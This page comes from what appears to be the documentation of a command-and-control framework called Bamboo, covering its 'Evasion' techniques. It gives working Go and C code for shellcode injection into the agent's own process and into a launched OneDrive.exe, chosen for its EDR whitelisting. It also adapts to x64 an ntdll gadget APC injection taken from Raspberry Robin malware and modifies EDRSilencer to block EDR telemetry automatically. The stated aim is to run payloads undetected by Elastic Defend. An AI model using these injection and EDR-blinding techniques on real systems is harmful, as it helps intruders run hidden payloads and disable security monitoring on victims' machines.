
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="http://Bamboo_Docs/evasion.html">
      
      
        <link rel="prev" href="index.html">
      
      
        <link rel="next" href="exploits.html">
      
      
      <link rel="icon" href="assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.30">
    
    
      
        <title>Evasion - Bamboo Docs</title>
      
    
    
      <link rel="stylesheet" href="assets/stylesheets/main.3cba04c6.min.css">
      
        
        <link rel="stylesheet" href="assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
        <script src="https://unpkg.com/iframe-worker/shim"></script>
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#evasion" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="index.html" title="Bamboo Docs" class="md-header__button md-logo" aria-label="Bamboo Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Bamboo Docs
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Evasion
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="index.html" title="Bamboo Docs" class="md-nav__button md-logo" aria-label="Bamboo Docs" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Bamboo Docs
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="index.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="evasion.html" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Evasion
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#shellcode-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Shellcode Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shellcode Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#virtual-allocation-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual Allocation Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-process-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Process Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntqueueapcthreadex-ntdll-gadget-injection" class="md-nav__link">
    <span class="md-ellipsis">
      NtQueueApcThreadEx NTDLL Gadget Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#edr-blinding" class="md-nav__link">
    <span class="md-ellipsis">
      EDR Blinding
    </span>
  </a>
  
    <nav class="md-nav" aria-label="EDR Blinding">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#edr-silencer" class="md-nav__link">
    <span class="md-ellipsis">
      EDR Silencer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="exploits.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exploits
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
     Teamserver API Reference
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
             Teamserver API Reference
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/__overview.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Overview
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/agent.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    /agent
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/authentication.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    /auth
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/exploit.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    /exploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/handler_func.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    /handler_func
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="_Teamserver_API_Reference/postexp.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    /postexp
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
      Agent Structure
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
              Agent Structure
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/__overview.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Overview
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/_agent.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    agent
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/agent-connect-c2_api.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    agent/connect/c2_api
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/agent-connect-websocket.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    agent/connect/websocket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/agent-exploit.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    agent/exploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="__Agent_Structure/agent-post_exploit.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    agent/post-exploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
       Database Models
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
               Database Models
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="___Database_Models/agent.html" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Agent
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#shellcode-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Shellcode Injection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Shellcode Injection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#virtual-allocation-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Virtual Allocation Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-process-injection" class="md-nav__link">
    <span class="md-ellipsis">
      Remote Process Injection
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ntqueueapcthreadex-ntdll-gadget-injection" class="md-nav__link">
    <span class="md-ellipsis">
      NtQueueApcThreadEx NTDLL Gadget Injection
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#edr-blinding" class="md-nav__link">
    <span class="md-ellipsis">
      EDR Blinding
    </span>
  </a>
  
    <nav class="md-nav" aria-label="EDR Blinding">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#edr-silencer" class="md-nav__link">
    <span class="md-ellipsis">
      EDR Silencer
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="evasion">Evasion</h1>
<h2 id="shellcode-injection">Shellcode Injection</h2>
<p>Elastic Defend is unable to detect malicious in-memory files. Thus, these shellcode injection techniques are effective in executing payloads undetected.</p>
<h3 id="virtual-allocation-injection">Virtual Allocation Injection</h3>
<p>Virtual Allocation injection is a technique used to inject shellcode into memory. As this method of injection uses VirtualAlloc, it allocates and injects shellcode into the memory of its own process.</p>
<p>The exploits used by Bamboo tend to crash the injected process, so using Virtual Allocation will likely cause the Agent that ran it to crash.</p>
<p>The technique involves the following steps:</p>
<ol>
<li>Use VirtualAlloc to reserve space to inject the shellcode inside the process.</li>
<li>Copy the shellcode into the reserved space using RtlCopyMemory.</li>
<li>Call VirtualProtect to change the protection on the injected space to allow execution.</li>
<li>Create a new thread in the process using CreateThread to run the shellcode in the injected space.</li>
<li>WaitForSingleObject is used to wait for the thread to finish.</li>
</ol>
<p><strong>Implementation</strong></p>
<p><a href="https://github.com/zaneGittins/go-inject">zaneGittins’ go-inject</a> simplifies using Windows functions related to injections, and used by the agent to implement this technique.</p>
<details>
<summary>Expand code</summary>


<pre><code class="language-go">func VirturalAlloc(payload string) (err error) {
  sc, err := hex.DecodeString(payload)
  if err != nil {
    fmt.Printf(&quot;\nError decoding shellcode: %s\n&quot;, err)
    return
  }

  address := inject.VirtualAlloc(uintptr(0), len(sc), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
  inject.RtlMoveMemory2(address, sc)
  inject.VirtualProtect(address, len(sc), windows.PAGE_EXECUTE_READ)
  thread := inject.CreateThread(address)
  inject.WaitForSingleObject(thread, 0xFFFFFFFF)
  return
}
</code></pre>

</details>

<hr />
<h3 id="remote-process-injection">Remote Process Injection</h3>
<p>Remote Process Injection, also called Vanilla Process Injection, is a shellcode injection technique that injects the shellcode into the memory of another process. Unlike the Virtual Allocation Injection technique earlier, this technique used VirtualAllocEx rather than VirtualAlloc, which allocates memory in another process instead of the local process.</p>
<p>The advantages of using process injection over injecting into itself are:</p>
<ul>
<li>Causing the injected process to crash instead of the agent used to inject.</li>
<li>Make use of any whitelisting detection tools have for the injected process</li>
</ul>
<p>The steps this technique uses is:</p>
<ol>
<li>Get the PID of the process to inject.</li>
<li>Call OpenProcess to get a handle for the process to inject into.</li>
<li>Use VirtualAllocEx to allocate space for the shellcode in the remote process.</li>
<li>Write the shellcode into the allocated space using WriteProcessMemory.</li>
<li>Create a thread in the remote process with CreateRemoteThread to run the allocated space.</li>
<li>Close the handle to the process with CloseHandle.</li>
</ol>
<p><strong>Implementation</strong></p>
<p>Instead of finding the PID of a suitable process, the Agent will launch OneDrive.exe from the user’s home directory. OneDrive is a very suitable process to inject into with the exploits Bamboo has, and launching the process before injecting into it will ensure that the process will be available to inject into. It is also whitelisted from Elastic Security’s Component Model Hijacking as it is considered a noisy process.</p>
<details>
<summary>Expand code</summary>


<pre><code class="language-go">...
sc, err := hex.DecodeString(payload)
if err != nil {
  return
}
 find and launch OneDrive.exe and use its PID
currentUser, _ := user.Current()
oneDriveExe := currentUser.HomeDir + &quot;\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe&quot;
cmd := exec.Command(oneDriveExe)
cmd.Stdout = os.Stdout
// Start() runs the command without waiting for return - rest of the code can continue
  err = cmd.Start()
  if err != nil {
  fmt.Println(err)
    return errors.New(&quot;cannot launch process&quot;)
}
exploitPID := cmd.Process.Pid
fmt.Println(&quot;exploit pid:&quot;, exploitPID)
...
</code></pre>

</details>

<p>The rest of the injection technique is implemented with <a href="https://github.com/zaneGittins/go-inject">zaneGittins’ go-inject</a> library.</p>
<details>
<summary>Expand code</summary>


<pre><code class="language-go">...
processHandle, _ := inject.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uint32(int(exploitPID)))
memptr := inject.VirtualAllocEx(processHandle, uintptr(0), len(sc), 0x3000, 0x40)

_ = inject.WriteProcessMemory(processHandle, memptr, sc)
inject.CreateRemoteThread(processHandle, 0, 0, memptr, 0, 0, 0)
inject.CloseHandle(processHandle)
fmt.Println(windows.GetLastError())
return
</code></pre>

</details>
<hr />
<h3 id="ntqueueapcthreadex-ntdll-gadget-injection">NtQueueApcThreadEx NTDLL Gadget Injection</h3>
<p><strong>Description</strong></p>
<p>This is a novel shellcode injection method first used by Roshtyak, the DLL backdoor used by the malware Raspberry Robin. This was adapted into a C program and published on github by <a href="https://github.com/LloydLabs/ntqueueapcthreadex-ntdll-gadget-injection">LLoydLabs</a>, which is the original code Bamboo uses for its NtQueueApcThreadEx NTDLL Gadget Injection. The image below shows the parameters of <code>NtQueueApcThreadEx()</code>, a function in the Windows Native API. The original code only works with x86 shellcode. However, in the explanation below, the gadget <code>pop rax; ret</code> is used instead of <code>pop r32; ret</code> to make the technique work with x64 shellcode instead.</p>
<p><img alt="ntqueueapcthreadex_api" src="img/ntqueue.png" /></p>
<p>The technique uses the following steps:</p>
<ol>
<li>Allocate shellcode into the memory of the current process</li>
<li>Scan the ntdll.dll code sections of the current process for a <code>pop rax; ret</code> gadget and pick 1 of these gadgets randomly. <ul>
<li>“rax” refers to a general-purpose register such as eax, ebc, ecx etc. Thus, an example gadget that would meet this requirement is <code>pop ebp; ret</code>. </li>
<li>An exception is the gadget <code>pop esp; ret</code> because this would pivot the stack. </li>
<li>“Code sections” refers to IMAGE_SCN_CNT_CODE and IMAGE_SCN_MEM_EXECUTE</li>
</ul>
</li>
<li>Call <code>NtQueueApcThreadEx()</code> with the <code>ApcRoutine</code> set to the address of the random gadget found in step 2 (<code>pop rax; ret</code>) and <code>SystemArgument1</code> as the pointer to the shellcode allocated in step 1. <ul>
<li>With <code>ApcRoutine</code> set to the random gadget, the <code>pop r32</code> instruction will make the stack pointer point to <code>SystemArgument1</code>. </li>
<li>The <code>ret</code> instruction will make the Instruction Pointer (IP) jump to the location that <code>SystemArgument1</code> points to, which is the location of the allocated shellcode in step 1  </li>
</ul>
</li>
</ol>
<p>This technique requires Microsoft Visual C++ redistributables x86 to be installed on the target which can be found at <a href="https://aka.ms/vs/16/release/vc_redist.x86.exe">https://aka.ms/vs/16/release/vc_redist.x86.exe</a>.</p>
<p><strong>Implementation</strong></p>
<p>The code is modified to work with x64 shellcode by changing a single line in gadget.h as shown in the code snippet below.</p>
<details>
<summary>Expand code</summary>


<pre><code class="language-c">static
BOOL
gadget_match_valid(
    PBYTE pbAddress
)
{
    //return (*pbAddress != 0x5C &amp;&amp; (*pbAddress &amp; 0xF0) == 0x50) &amp;&amp; *(pbAddress + 1) == 0xC3; // for x86
    return *pbAddress == 0x58 &amp;&amp; *(pbAddress + 1) == 0xC3; // for x64

}
</code></pre>

</details>

<p>Additionally, in the original code, the shellcode was hardcoded in main.h. In Bamboo, the code is modified to receive shellcode via standard input. After the injection program is dropped onto the target and executed, the shellcode will be passed via standard input from the agent as a hexstring in the format “ab1823129ef…”, which is the standard format of shellcode that our agent uses for its injection techniques. This hexstring is stored into a buffer of the injection program and converted by a <code>convert_hex()</code> function into a hexstring of format “\xab\x18\x23\x12\xef…”. The rest of the code follows the logic of the original PoC from LloydLabs.</p>
<hr />
<h2 id="edr-blinding">EDR Blinding</h2>
<p>The tool below is not an injection technique, but instead used to disrupt the effectiveness of the EDR itself.</p>
<h3 id="edr-silencer">EDR Silencer</h3>
<p><strong>Description</strong></p>
<p>EDRSilencer, created by <a href="https://github.com/netero1010">netero1010</a> is an <a href="https://github.com/netero1010/EDRSilencer">open-source</a> evasion tool designed for disrupting Endpoint Detection and Response (EDR) systems. It leverages Windows Filtering Platform (WFP) APIs, which allows a program developer to create network filtering software that can examine, modify and stop network traffic. EDRSilencer uses the WFP to prevent EDR agents and processes from connecting and reporting security events with their servers, effectively disabling the EDR’s threat detection capabilities of the EDR. The tool currently supports Elastic EDR, among other popular EDR solutions.</p>
<p><strong>Implementation</strong></p>
<p>In the <a href="https://github.com/netero1010/EDRSilencer/blob/main/EDRSilencer.c">original code's</a> main function, it checks if the user inputs the correct number of command-line arguments and performs different actions based on the argument’s value:</p>
<table>
<thead>
<tr>
<th>Arguments</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-h or --help</td>
<td>Prints the help information</td>
</tr>
<tr>
<td>blockedr</td>
<td>Blocks all detected EDR processes from sending outbound traffic</td>
</tr>
<tr>
<td>block <process path></td>
<td>Blocks a specific process from sending outbound traffic</td>
</tr>
<tr>
<td>unblockall</td>
<td>Removes all WFP filters applied</td>
</tr>
<tr>
<td>unblock <filter id></td>
<td>Removes a specific WFP filter based on its filter ID</td>
</tr>
</tbody>
</table>
<p>The team modified the main function of the original code. The modified code no longer requires command-line arguments. It has been altered to only execute the  <code>blockedr</code> argument. The modified code is as follows:</p>
<details>
<summary>Expand code</summary>


<pre><code class="language-c">int main() {
    if (!CheckProcessIntegrityLevel()) {
        return 1;
    }
    PrintHelp();
    BlockEdrProcessTraffic();
    return 0;
}
</code></pre>

</details>
<p>This modification allows the executable to be easily incorporated within our C2 and agent, making it more convenient and efficient for our purposes.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="index.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: Introduction">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Introduction
              </div>
            </div>
          </a>
        
        
          
          <a href="exploits.html" class="md-footer__link md-footer__link--next" aria-label="Next: Exploits">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                Exploits
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": ".", "features": ["header.autohide", "navigation.footer", "navigation.expand", "navigation.path"], "search": "assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="assets/javascripts/bundle.fe8b6f2b.min.js"></script>
      
    
  </body>
</html>